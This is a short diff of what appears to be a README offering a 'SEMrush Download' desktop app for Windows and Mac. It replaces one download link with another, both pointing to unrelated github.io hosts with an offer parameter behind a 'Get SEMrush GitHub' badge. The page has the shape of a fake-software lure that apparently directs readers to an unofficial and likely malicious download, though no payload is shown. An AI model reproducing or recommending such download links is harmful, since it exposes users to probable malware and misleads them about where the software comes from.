@@ -1,6 +1,6 @@
 # SEMrush Download — Desktop SEO and Marketing Analytics Platform for Windows and Mac
 
-<a href="https://git-setup-io.github.io/.github/?offer=SEMrush" target="_blank">
+<a href="https://prog-git-app.github.io/.github//?offer=SEMrush" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20SEMrush%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
